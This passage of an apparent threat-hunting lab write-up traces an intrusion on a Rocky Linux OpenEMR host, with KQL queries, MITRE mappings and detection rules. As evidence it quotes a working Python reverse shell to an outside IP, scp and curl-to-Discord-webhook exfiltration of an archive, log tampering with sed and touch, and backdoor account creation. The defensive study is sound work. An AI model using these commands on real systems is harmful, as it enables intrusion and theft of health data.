**MITRE Reference:** [T1552.001](https://attack.mitre.org/techniques/T1552/001)

</details>

---

<details>
<summary>🚩 <strong>Flag 11: Physical Mapping Confirmation</strong> — <code>T1083</code> — 🟡 Medium</summary>

### 🎯 Objective
Identify the command used to recursively enumerate Docker volume storage.

### 📌 Finding
`find /var/lib/docker/volumes -maxdepth 3 -type f` — broad recursive enumeration of all Docker volume contents with a depth limit.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `rocky83` |
| **Account** | `root` |
| **Timestamp** | `2026-02-09 17:03:14 UTC` |
| **Command** | `find /var/lib/docker/volumes -maxdepth 3 -type f` |

### 💡 Why It Matters
This was the attacker mapping the physical file layout of all Docker volumes — the foundation for identifying exactly where the MariaDB data and OpenEMR site files physically live on disk.

### 🔗 Attack Chain Position
Follows `docker inspect` — physical confirmation of volume layout before targeted data access.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName contains "rocky83"
| where ProcessCommandLine has_any ("find", "ls -R")
| where ProcessCommandLine contains "/var/lib/docker"
| project TimeGenerated, ProcessCommandLine, AccountName
| sort by TimeGenerated asc
```

### 🛡️ Detection Recommendation
**Hunting Tip:** Don't over-filter `find` commands with `-name` or specific file type constraints — the bare recursive enumeration is what attackers use to map storage, not targeted searches.

**MITRE Reference:** [T1083](https://attack.mitre.org/techniques/T1083)

</details>

---

<details>
<summary>🚩 <strong>Flag 12: Where the Data Actually Lives</strong> — <code>T1083</code> — 🟡 Medium</summary>

### 🎯 Objective
Identify the host filesystem path the attacker confirmed as persistent database storage.

### 📌 Finding
`ls -l` across all `_data` volume paths revealed `/var/lib/docker/volumes/r0ckyyy335_mariadb_data/_data` as the MariaDB storage path.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `rocky83` |
| **Account** | `root` |
| **Database Volume Path** | `/var/lib/docker/volumes/r0ckyyy335_mariadb_data/_data` |
| **App Volume Path** | `/var/lib/docker/volumes/r0ckyyy335_openemr_sites/_data` |

### 💡 Why It Matters
Identifies the precise physical location of the MariaDB database on the host — gives the attacker a direct path to the data without going through the container.

### 🔗 Attack Chain Position
Follows volume enumeration — completes physical storage mapping before staging.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName contains "rocky83"
| where AccountName == "root"
| where ProcessCommandLine contains "/var/lib/docker/volumes"
| where ProcessCommandLine contains "_data"
| where ProcessCommandLine has_any ("mariadb", "mysql", "db")
| project TimeGenerated, ProcessCommandLine, AccountName
| sort by TimeGenerated asc
```

### 🛡️ Detection Recommendation
**Hunting Tip:** Docker named volumes follow the pattern `<compose_project>_<volume_name>/_data`. The `_data` suffix is the physical mountpoint — filtering for it in combination with database keywords isolates storage mapping from general noise.

**MITRE Reference:** [T1083](https://attack.mitre.org/techniques/T1083)

</details>

---

<details>
<summary>🚩 <strong>Flag 13: Hijacking a Trusted Repeating Path</strong> — <code>T1543.002</code> — 🟠 High</summary>

### 🎯 Objective
Identify the operational script the attacker hijacked for staging.

### 📌 Finding
`sudo tee /opt/backup/scripts/backup_manifest.sh` — the attacker wrote to an existing backup script using `tee`, hijacking a trusted repeating scheduled job.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `rocky83` |
| **Account** | `root` |
| **Script Hijacked** | `/opt/backup/scripts/backup_manifest.sh` |
| **Method** | `sudo tee` |

### 💡 Why It Matters
`backup_manifest.sh` was an existing cron-scheduled script — by hijacking it, the attacker gained execution that runs automatically without interactive logons, providing reliable and deniable staging capability.

### 🔗 Attack Chain Position
Transitions from recon/credential access to staging infrastructure setup.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where DeviceName contains "rocky83"
| where AccountName == "root"
| where ProcessCommandLine contains "/opt"
| where ProcessCommandLine has_any ("bash", "sh", ".sh")
| project TimeGenerated, ProcessCommandLine, AccountName
| sort by TimeGenerated asc
```

### 🛡️ Detection Recommendation

**Alert Rule:**
```
IF ProcessCommandLine has "tee"
AND ProcessCommandLine contains "/opt"
AND ProcessCommandLine contains ".sh"
THEN ALERT — HIGH
```

**Hunting Tip:** `sudo tee <script>` is a classic write technique — it overwrites a file as root while appearing as a benign pipe. Look for `tee`, `echo >>`, or `cat >>` targeting scripts under `/opt` or `/usr/local` rather than script execution itself.

**MITRE Reference:** [T1543.002](https://attack.mitre.org/techniques/T1543/002)

</details>

---

<details>
<summary>🚩 <strong>Flag 14: Staging Prep Directory</strong> — <code>T1560.001</code> — 🟠 High</summary>

### 🎯 Objective
Identify the directory used for staging compressed archives before exfiltration.

### 📌 Finding
`tar -czf /var/lib/integrations/integration_state_$(date +%F_%H-%M-%S).tar.gz` — cron job writing archives to `/var/lib/integrations/`, a path that blends in with legitimate system storage.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `rocky83` |
| **Account** | `root` |
| **Staging Directory** | `/var/lib/integrations/` |
| **Archive Source** | `/var/log/openemr/doc_exports/` |
| **Schedule** | `Cron — 22:00 daily` |

### 💡 Why It Matters
`/var/lib/integrations/` looks like legitimate system storage — a sysadmin glancing at `/var/lib` would not flag it. Archives were generated automatically via cron, requiring no interactive attacker presence.

### 🔗 Attack Chain Position
Staging infrastructure — archives are written here before exfiltration.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where DeviceName has "rocky83"
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where InitiatingProcessAccountName in ("root", "it.admin")
| where ProcessCommandLine has "tar"
| where ProcessCommandLine has "-c"
| project TimeGenerated, ProcessCommandLine, InitiatingProcessAccountName
| sort by TimeGenerated asc
```

### 🛡️ Detection Recommendation
**Hunting Tip:** When archive files don't appear in DeviceFileEvents, pivot to DeviceProcessEvents and filter for `tar -c` — the output path in the command line is the staging directory. Paths under `/var/lib` that don't correspond to known services are high-fidelity indicators.

**MITRE Reference:** [T1560.001](https://attack.mitre.org/techniques/T1560/001)

</details>

---

<details>
<summary>🚩 <strong>Flag 15: The Unauthorised Account</strong> — <code>T1136.001</code> — 🔴 Critical</summary>

### 🎯 Objective
Identify the unauthorized backdoor account created to blend into the environment.

### 📌 Finding
An account named `system` — 1,092 successful logons — blends into logon telemetry as apparent background noise. No such account exists natively on RockyLinux.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `rocky83` |
| **Account** | `system` |
| **Logon Count** | `1,092 successful logons` |
| **Creation Method** | `vipw` (direct `/etc/passwd` edit) |

### 💡 Why It Matters
`system` is not a default Linux account. The name mimics the assumption that "system" logons are normal background activity — making it invisible to casual review of authentication logs.

### 🔗 Attack Chain Position
Persistence — provides long-term access that survives credential resets of known attacker accounts.

### 🔧 KQL Query Used

```kql
DeviceLogonEvents
| where DeviceName has "rocky83"
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where ActionType == "LogonSuccess"
| summarize count() by AccountName
| order by count_ asc
```

### 🛡️ Detection Recommendation

**Alert Rule:**
```
IF AccountName == "system"
AND LogonType == "Local" OR "Interactive"
AND DeviceOS contains "Linux"
THEN ALERT — CRITICAL
```

**Hunting Tip:** When hunting unauthorized accounts, don't rely solely on `useradd` process telemetry — attackers delete those entries. Pivot to logon telemetry and summarize by `AccountName`. Accounts that look like system processes but have high logon counts are prime candidates.

**MITRE Reference:** [T1136.001](https://attack.mitre.org/techniques/T1136/001)

</details>

---

<details>
<summary>🚩 <strong>Flag 16: Binary Used to Create the Identity</strong> — <code>T1036</code> — 🟠 High</summary>

### 🎯 Objective
Identify the binary used to create the `system` backdoor account and provide its SHA256.

### 📌 Finding
`vipw` — a legitimate vi-based passwd editor — was used to directly edit `/etc/passwd`, bypassing `useradd` detection entirely.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `rocky83` |
| **Account** | `it.admin` |
| **Timestamp** | `2026-02-09 17:30:35 UTC` |
| **Binary** | `vipw` |
| **SHA256** | `dbb794466563134e5119efa47fd41c4ffb31a8104b59bba11eb630f55238abd0` |

### 💡 Why It Matters
`vipw` is indistinguishable from legitimate sysadmin maintenance. It edits `/etc/passwd` directly with file locking — the same tool a real admin would use — generating no `useradd` process events for detection rules to catch.

### 🔗 Attack Chain Position
Stealthy persistence via direct passwd manipulation — evades useradd-based detections.

### 🔧 KQL Query Used

```kql
DeviceFileEvents
| where DeviceName has "rocky83"
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where FolderPath == "/etc/passwd"
| project TimeGenerated, InitiatingProcessCommandLine, InitiatingProcessFileName, InitiatingProcessSHA256, InitiatingProcessAccountName
| sort by TimeGenerated asc
```

### 🛡️ Detection Recommendation

**Alert Rule:**
```
IF FolderPath == "/etc/passwd"
AND InitiatingProcessFileName not in ("useradd", "usermod", "adduser", "passwd")
THEN ALERT — HIGH
```

**Hunting Tip:** Filter DeviceFileEvents on `/etc/passwd` as the FolderPath and inspect `InitiatingProcessFileName` — any binary other than standard account management tools is suspicious.

**MITRE Reference:** [T1036](https://attack.mitre.org/techniques/T1036)

</details>

---

<details>
<summary>🚩 <strong>Flag 17: Persistence Artifact</strong> — <code>T1543.002</code> — 🔴 Critical</summary>

### 🎯 Objective
Identify the systemd service unit file created for persistence.

### 📌 Finding
`integration-monitor.service` — created under `/etc/systemd/system/`, blending in with hundreds of legitimate service unit files.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `rocky83` |
| **File** | `integration-monitor.service` |
| **Location** | `/etc/systemd/system/` |

### 💡 Why It Matters
Systemd service units fire on boot and on demand without interactive logons — providing reliable, persistent execution that survives reboots. The name `integration-monitor` sounds like a legitimate operational service.

### 🔗 Attack Chain Position
Persistence mechanism — anchors the C2 channel to survive reboots and session terminations.

### 🔧 KQL Query Used

```kql
DeviceFileEvents
| where DeviceName has "rocky83"
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where FolderPath contains "systemd/system"
| where InitiatingProcessAccountName in ("root", "it.admin")
| project TimeGenerated, FolderPath, FileName, InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

### 🛡️ Detection Recommendation

**Alert Rule:**
```
IF FolderPath contains "/etc/systemd/system"
AND ActionType == "FileCreated"
AND InitiatingProcessAccountName not in (expected_admin_accounts)
THEN ALERT — CRITICAL
```

**MITRE Reference:** [T1543.002](https://attack.mitre.org/techniques/T1543/002)

</details>

---

<details>
<summary>🚩 <strong>Flag 18: Binary Used to Create Persistence Artifact</strong> — <code>T1036</code> — 🟡 Medium</summary>

### 🎯 Objective
Identify the binary used to create the `integration-monitor.service` file.

### 📌 Finding
`cat` — used with output redirection to write the service file without spawning an editor process, leaving no interactive editor telemetry.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `rocky83` |
| **Account** | `root` |
| **Timestamp** | `2026-02-10 17:07:16 UTC` |
| **Binary** | `cat` |
| **SHA256** | `5320b7dc509866e7b98cbaa4062f91be002638fc56b4ba305848fc511dda9012` |

### 💡 Why It Matters
`cat > file` writes a file without spawning an editor — no vim/nano process signature in telemetry. Subsequent vim edits appeared later but the initial creation was via cat.

### 🔧 KQL Query Used

```kql
DeviceFileEvents
| where DeviceName has "rocky83"
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where FileName == "integration-monitor.service"
| project TimeGenerated, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessSHA256, InitiatingProcessAccountName
| sort by TimeGenerated asc
```

### 🛡️ Detection Recommendation
**Hunting Tip:** Filter DeviceFileEvents on the exact filename and project `InitiatingProcessFileName` — the binary that wrote the file is your answer. `cat > file` is a common technique to avoid editor process telemetry.

**MITRE Reference:** [T1036](https://attack.mitre.org/techniques/T1036)

</details>

---

<details>
<summary>🚩 <strong>Flag 19: SHA256 of Armed Service File</strong> — <code>T1543.002</code> — 🔴 Critical</summary>

### 🎯 Objective
Identify the SHA256 of the service file version used to launch the C2 connection.

### 📌 Finding
Three versions of the file existed. The 4:16 AM vim edit on 2/11 is the armed version — the service was enabled at 4:16:15 AM and the reverse shell fired at 4:18:21 AM. The 4:07 PM edit on 2/11 was a post-C2 modification.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `rocky83` |
| **Timestamp of Armed Version** | `2026-02-11 04:16:01 UTC` |
| **SHA256 (Armed)** | `f71ea834a9be9fb0e90c7b496e5312072fffedf1d1c0377957e05714bdac37b8` |
| **SHA256 (Initial)** | `3a9ed2177221f877bb3877e72a6a8bcdfbf23aa1647467c76bb11fc6a8f17f57` |
| **SHA256 (Post-C2)** | `32890db562a1280cca0ddf9231520383842a73425d8cec9028d018a6579685d6` |

### 💡 Why It Matters
The armed version is the forensic artifact that triggered C2 — its hash is the definitive evidence linking the service file modification to the outbound shell connection.

### 🔧 KQL Query Used

```kql
DeviceFileEvents
| where DeviceName has "rocky83"
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where FileName == "integration-monitor.service"
| project TimeGenerated, ActionType, SHA256, InitiatingProcessFileName, InitiatingProcessAccountName
| sort by TimeGenerated asc
```

### 🛡️ Detection Recommendation
**Hunting Tip:** When multiple versions of a file exist, the answer isn't always the last write — it's the version active when the behavior triggered. Cross-reference file write timestamps against C2 connection timestamps to identify which version was in play.

**MITRE Reference:** [T1543.002](https://attack.mitre.org/techniques/T1543/002)

</details>

---

<details>
<summary>🚩 <strong>Flag 20: C2 One-Liner</strong> — <code>T1059.004</code> — 🔴 Critical</summary>

### 🎯 Objective
Identify the complete process command line that established the interactive C2 connection.

### 📌 Finding
A Python reverse shell using `os.dup2` to redirect stdin/stdout/stderr to a socket, spawning `/bin/sh -i`.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `rocky83` |
| **Account** | `root` / `it.admin` |
| **C2 IP** | `20.62.27.80:443` |
| **Command** | `/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("20.62.27.80",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` |

### 💡 Why It Matters
Port 443 was chosen to blend with HTTPS traffic. The `os.dup2` technique redirects all standard I/O to the socket, creating a fully interactive shell over the outbound connection.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where DeviceName has "rocky83"
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where ProcessCommandLine has "dup2"
| project TimeGenerated, ProcessCommandLine, InitiatingProcessAccountName
| sort by TimeGenerated asc
```

### 🛡️ Detection Recommendation

**Alert Rule:**
```
IF ProcessCommandLine has "dup2"
AND ProcessCommandLine has "socket"
AND ProcessCommandLine has "subprocess"
THEN ALERT — CRITICAL
```

**Hunting Tip:** `os.dup2` is the signature of a Python reverse shell — it's specific enough to use as a high-fidelity hunt anchor without generating significant false positives.

**MITRE Reference:** [T1059.004](https://attack.mitre.org/techniques/T1059/004)

</details>

---

<details>
<summary>🚩 <strong>Flag 21: Reverse Shell Process Identification</strong> — <code>T1059.004</code> — 🔴 Critical</summary>

### 🎯 Objective
Identify the ProcessId of the interactive shell session spawned by the reverse shell.

### 📌 Finding
ProcessId `8000` — `/bin/sh -i` spawned at 2026-02-11 04:18:21 UTC immediately after python3 reverse shell (ProcessId 7999), confirmed active by `whoami` at 04:18:29 UTC.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `rocky83` |
| **Timestamp** | `2026-02-11 04:18:21 UTC` |
| **Python3 ProcessId** | `7999` |
| **Interactive Shell ProcessId** | `8000` |
| **Command** | `/bin/sh -i` |
| **First Operator Command** | `whoami` at 04:18:29 UTC |

### 💡 Why It Matters
Identifies the exact process representing the attacker's interactive session — anchor for all subsequent operator commands executed over C2.

### 🔗 Attack Chain Position
C2 established — attacker now has interactive access without direct SSH authentication.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where DeviceName has "rocky83"
| where TimeGenerated between (datetime(2026-02-11T04:16:15) .. datetime(2026-02-11T04:20:00))
| project TimeGenerated, ProcessId, FileName, ProcessCommandLine, InitiatingProcessId, InitiatingProcessParentId, AccountName
| sort by TimeGenerated asc
```

### 🛡️ Detection Recommendation
**Hunting Tip:** Follow the artifact activation timestamp precisely — `systemctl enable` fires the service which spawns the reverse shell and its `/bin/sh -i` subprocess. The interactive shell is always the process immediately after the python3 reverse shell in the timeline. Confirm with a `whoami` or `id` command appearing seconds later.

**MITRE Reference:** [T1059.004](https://attack.mitre.org/techniques/T1059/004)

</details>

---

<details>
<summary>🚩 <strong>Flag 22: Staged Archive Identification</strong> — <code>T1560.001</code> — 🟠 High</summary>

### 🎯 Objective
Identify the filename of the archive prepared for exfiltration.

### 📌 Finding
`integration_state_2026-02-10_22-00-01.tar.gz` — transferred via `scp` to `streetrack@20.62.27.80`.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `rocky83` |
| **Archive** | `integration_state_2026-02-10_22-00-01.tar.gz` |
| **Transfer Command** | `scp integration_state_2026-02-10_22-00-01.tar.gz streetrack@20.62.27.80:/home/streetrack/` |
| **Timestamp** | `2026-02-11 04:20:28 UTC` |

### 💡 Why It Matters
The archive contains OpenEMR document exports — confirms what data was actually exfiltrated and provides the basis for breach notification scope.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where DeviceName has "rocky83"
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where ProcessCommandLine has "20.62.27.80"
| where ProcessCommandLine has_any (".tar", ".gz", ".zip", ".tgz")
| project TimeGenerated, ProcessCommandLine, AccountName
| sort by TimeGenerated asc
```

### 🛡️ Detection Recommendation
**Hunting Tip:** Anchor on the known C2 IP combined with archive file extensions in DeviceProcessEvents to surface the exact filename being transferred. Exfiltration telemetry surfaces in process command lines — not just network events.

**MITRE Reference:** [T1560.001](https://attack.mitre.org/techniques/T1560/001)

</details>

---

<details>
<summary>🚩 <strong>Flag 23: First Exfiltration Attempt</strong> — <code>T1048</code> — 🟠 High</summary>

### 🎯 Objective
Identify the command line tied to the failed first exfiltration attempt.

### 📌 Finding
sftp connection to `20.62.27.80:22` failed at 04:22 AM — network controls blocked the sftp protocol, forcing a pivot to scp then eventually Discord.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `rocky83` |
| **Timestamp** | `2026-02-11 04:22:39 UTC` |
| **ActionType** | `ConnectionFailed` |
| **RemoteIP** | `20.62.27.80` |
| **RemotePort** | `22` |
| **Command** | `/usr/bin/ssh -x -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -oForwardAgent=no -l streetrack -s -- 20.62.27.80 sftp` |

### 💡 Why It Matters
Reveals the exfiltration pivot chain — sftp blocked → scp attempted → Discord webhook used for final successful exfil. Also exposes the attacker's destination username: `streetrack`.

### 🔧 KQL Query Used

```kql
DeviceNetworkEvents
| where DeviceName has "rocky83"
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where InitiatingProcessFileName in ("scp", "ssh", "sftp")
| project TimeGenerated, ActionType, RemoteIP, RemotePort, InitiatingProcessCommandLine, InitiatingProcessAccountName
| sort by TimeGenerated asc
```

### 🛡️ Detection Recommendation
**Hunting Tip:** Failed exfiltration attempts appear in DeviceNetworkEvents as `ConnectionFailed` — filter on transfer binaries and look for failed connections to non-standard destinations. The `InitiatingProcessCommandLine` reveals the full transfer command.

**MITRE Reference:** [T1048](https://attack.mitre.org/techniques/T1048)

</details>

---

<details>
<summary>🚩 <strong>Flag 24: Successful Exfiltration Pivot</strong> — <code>T1567.002</code> — 🔴 Critical</summary>

### 🎯 Objective
Identify the command line that successfully transferred data out via a SaaS platform.

### 📌 Finding
`curl` to a Discord webhook — legitimate HTTPS traffic that bypassed network egress controls.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `rocky83` |
| **Account** | `it.admin` |
| **Timestamp** | `2026-02-13 20:10:51 UTC` |
| **Platform** | `Discord` |
| **Command** | `curl -F file=@integration_state_2026-02-10_22-00-01.tar.gz https://discord.com/api/webhooks/REDACTED/REDACTED` |

### 💡 Why It Matters
Discord webhooks are a growing exfiltration vector — they generate standard HTTPS traffic to trusted domains, bypassing most network controls. The webhook URL is a permanent IOC that should be reported to Discord for takedown.

### 🔗 Attack Chain Position
Final successful exfiltration — data confirmed out of environment.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where DeviceName has "rocky83"
| where TimeGenerated between (datetime(2026-02-11T04:37:00) .. datetime(2026-02-14))
| where FileName == "curl"
| project TimeGenerated, ProcessCommandLine, AccountName
| sort by TimeGenerated asc
```

### 🛡️ Detection Recommendation

**Alert Rule:**
```
IF ProcessCommandLine has "curl"
AND ProcessCommandLine has "discord.com/api/webhooks"
THEN ALERT — CRITICAL
```

**MITRE Reference:** [T1567.002](https://attack.mitre.org/techniques/T1567/002)

</details>

---

<details>
<summary>🚩 <strong>Flag 25: Exfiltration IP and Port</strong> — <code>T1567.002</code> — 🔴 Critical</summary>

### 🎯 Objective
Identify the IP address and port that carried the successful exfiltration.

### 📌 Finding
`162.159.135.232:443` — Cloudflare CDN infrastructure serving Discord, over HTTPS.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `rocky83` |
| **Timestamp** | `2026-02-13 20:10:51 UTC` |
| **RemoteIP** | `162.159.135.232` |
| **RemotePort** | `443` |
| **ActionType** | `ConnectionRequest` |

### 💡 Why It Matters
Port 443 to Cloudflare is indistinguishable from normal HTTPS web traffic — confirming why network controls failed to block this exfiltration method. Blocking the specific webhook URL is more effective than IP-based blocking.

### 🔧 KQL Query Used

```kql
DeviceNetworkEvents
| where DeviceName has "rocky83"
| where TimeGenerated between (datetime(2026-02-13T20:10:00) .. datetime(2026-02-13T20:12:00))
| where InitiatingProcessFileName == "curl"
| project TimeGenerated, RemoteIP, RemotePort, RemoteUrl, ActionType, InitiatingProcessCommandLine
| sort by TimeGenerated asc
```

**MITRE Reference:** [T1567.002](https://attack.mitre.org/techniques/T1567/002)

</details>

---

<details>
<summary>🚩 <strong>Flag 26: Selective Log Cleanup</strong> — <code>T1070.003</code> — 🟠 High</summary>

### 🎯 Objective
Count the distinct `sed -i` delete operations run across `/var/log/secure` and `/var/log/messages` during the cleanup window.

### 📌 Finding
12 distinct `sed -i` delete operations targeting evidence categories across both log files between 2026-02-11 16:13-16:16 UTC.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `rocky83.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net` |
| **Window** | `2026-02-11 16:13:00 – 16:16:00 UTC` |
| **Log Files** | `/var/log/secure`, `/var/log/messages` |
| **Distinct Operations** | `12` |

### 💡 Why It Matters
Selective deletion of specific evidence categories (useradd, vipw, python3 socket, systemctl, it.admin) shows deliberate anti-forensics — the attacker understood exactly what telemetry to remove. MDE process events captured the cleanup commands themselves.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where DeviceName == "rocky83.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where TimeGenerated between (datetime(2026-02-11T16:13:00) .. datetime(2026-02-11T16:16:00))
| where FileName == "sed"
| where ProcessCommandLine has_any ("/var/log/secure", "/var/log/messages")
| distinct ProcessCommandLine
| count
```

### 🛡️ Detection Recommendation
**Hunting Tip:** Filter on `FileName == "sed"` rather than `ProcessCommandLine has "sed -i"` — this strips sudo wrapper entries that would double-count the same operation.

**MITRE Reference:** [T1070.003](https://attack.mitre.org/techniques/T1070/003)

</details>

---

<details>
<summary>🚩 <strong>Flag 27: Log Manipulation Binary</strong> — <code>T1070.003</code> — 🟠 High</summary>

### 🎯 Objective
Identify the binary used to manipulate the log files.

### 📌 Finding
`sed` — the only binary in the log file process list capable of in-place text deletion.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Binary** | `sed` |
| **Method** | `sed -i` — in-place deletion of matching lines |
| **Other Binaries on Log Files** | `cat, grep, tail, ls, cp, tar, touch, sudo, bash, du` (all read-only or administrative) |

### 💡 Why It Matters
`sed -i` performs in-place text manipulation with no interactive session — indistinguishable from legitimate log maintenance without process-level telemetry.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where DeviceName has "rocky83"
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where ProcessCommandLine has_any ("/var/log/secure", "/var/log/messages")
| distinct FileName
```

**MITRE Reference:** [T1070.003](https://attack.mitre.org/techniques/T1070/003)

</details>

---

<details>
<summary>🚩 <strong>Flag 28: Timeline Distortion</strong> — <code>T1070.006</code> — 🟠 High</summary>

### 🎯 Objective
Identify the forged timestamp applied to `/var/log/messages`.

### 📌 Finding
`touch -d "2026-02-06 12:00:00" /var/log/messages` — backdated 5 days before the attacker's actual active period to blur causality.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `rocky83` |
| **Account** | `it.admin` |
| **Timestamp of Action** | `2026-02-11 16:16:47 UTC` |
| **Forged Timestamp** | `2026-02-06 12:00:00` |
| **Target File** | `/var/log/messages` |

### 💡 Why It Matters
Backdating `/var/log/messages` to 2026-02-06 would make forensic timeline reconstruction appear to show no messages activity during the actual attack window — a deliberate attempt to blur causality for incident responders.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where DeviceName has "rocky83"
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where ProcessCommandLine has "touch"
| where ProcessCommandLine has "/var/log/messages"
| project TimeGenerated, ProcessCommandLine, AccountName
| sort by TimeGenerated asc
```

### 🛡️ Detection Recommendation

**Alert Rule:**
```
IF ProcessCommandLine has "touch"
AND ProcessCommandLine has_any ("/var/log/", "/var/log/secure", "/var/log/messages")
THEN ALERT — HIGH
```

**MITRE Reference:** [T1070.006](https://attack.mitre.org/techniques/T1070/006)

</details>

---

<details>
<summary>🚩 <strong>Flag 29: Cleanup Alert Classification</strong> — <code>T1070, T1070.006</code> — 🟠 High</summary>

### 🎯 Objective
Identify the MITRE technique classification assigned by the EDR alert on the cleanup activity.

### 📌 Finding
MDE alert `Suspicious timestamp modification` fired at 2026-02-11 16:26:06 UTC — 10 minutes after the `touch -d` backdating command — classifying the activity as T1070 (Indicator Removal) and T1070.006 (Timestomp).

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Alert Name** | `Suspicious timestamp modification` |
| **Timestamp** | `2026-02-11 16:26:06 UTC` |
| **Techniques** | `T1070` |
| **SubTechniques** | `T1070.006` |
| **Provider** | `Microsoft Defender for Endpoint` |

### 💡 Why It Matters
Confirms MDE has native detection for timestomping — the alert fired automatically without requiring a custom rule, validating the EDR's coverage of this technique.

### 🔧 KQL Query Used

```kql
SecurityAlert
| where TimeGenerated between (datetime(2026-02-04) .. datetime(2026-02-14))
| where Entities has "rocky83"
| where AlertName has_any ("timestamp", "touch", "log", "tamper", "cleanup", "indicator", "removal")
| project TimeGenerated, AlertName, Techniques, SubTechniques
| sort by TimeGenerated asc
```

**MITRE Reference:** [T1070](https://attack.mitre.org/techniques/T1070) / [T1070.006](https://attack.mitre.org/techniques/T1070/006)

</details>

---

## 🚨 Detection Gaps & Recommendations

### 🕳️ Observed Gaps

| Gap | Impact | Recommended Fix |
|-----|--------|----------------|
| No alerting on `vipw` execution | Critical — allowed backdoor account creation without `useradd` detection | Alert on `FileName == "vipw"` in DeviceProcessEvents |
| No egress filtering on Discord webhooks | Critical — allowed exfiltration over HTTPS to trusted domain | Block `discord.com/api/webhooks` at proxy/firewall; alert on curl to webhook endpoints |
| No alerting on `sed -i` against `/var/log/` files | High — allowed selective evidence destruction | Alert on `sed -i` targeting `/var/log/` paths |
| No alerting on new systemd service creation by non-system accounts | Critical — allowed persistent C2 via `integration-monitor.service` | Alert on FileCreated in `/etc/systemd/system/` by non-root or unexpected accounts |
| No alerting on `touch` against log files | High — allowed timestamp forgery to go undetected until EDR fired | Alert on `touch` targeting `/var/log/` paths |
| sftp blocked but scp and Discord not blocked | High — attacker pivoted easily to alternative exfil methods | Egress filtering on all outbound file transfer protocols except approved destinations |
| `useradd` log entries deletable by attacker | High — account creation evidence destroyed | MDE process telemetry retained evidence independently; ensure SIEM ingestion is real-time |

### ✅ Recommended Detection Rules

```
RULE 1 — vipw Execution (Stealthy Account Creation)
IF FileName == "vipw"
THEN ALERT CRITICAL

RULE 2 — Systemd Service Created by Attacker Account
IF FolderPath contains "/etc/systemd/system"
AND ActionType == "FileCreated"
AND InitiatingProcessAccountName not in (approved_admin_accounts)
THEN ALERT CRITICAL

RULE 3 — Python Reverse Shell Signature
IF ProcessCommandLine has "dup2"
AND ProcessCommandLine has "socket"
AND ProcessCommandLine has "subprocess"
THEN ALERT CRITICAL

RULE 4 — Log File Timestamp Forgery
IF ProcessCommandLine has "touch"
AND ProcessCommandLine has "/var/log/"
THEN ALERT HIGH

RULE 5 — Log File Selective Deletion
IF FileName == "sed"
AND ProcessCommandLine has "-i"
AND ProcessCommandLine has_any ("/var/log/secure", "/var/log/messages", "/var/log/auth")
THEN ALERT HIGH

RULE 6 — Discord Webhook Exfiltration
IF ProcessCommandLine has "curl"
AND ProcessCommandLine has "discord.com/api/webhooks"
THEN ALERT CRITICAL

RULE 7 — Direct /etc/passwd Modification by Non-Standard Binary
IF FolderPath == "/etc/passwd"
AND InitiatingProcessFileName not in ("useradd", "usermod", "adduser", "passwd", "chpasswd")
THEN ALERT CRITICAL

RULE 8 — Unauthorized Account Named "system"
IF AccountName == "system"
AND LogonType in ("Local", "Interactive")
AND DeviceOS contains "Linux"
THEN ALERT CRITICAL
```

---

## 🛠️ Remediation & Containment Checklist

### 🔴 Immediate Actions (0–4 hours)

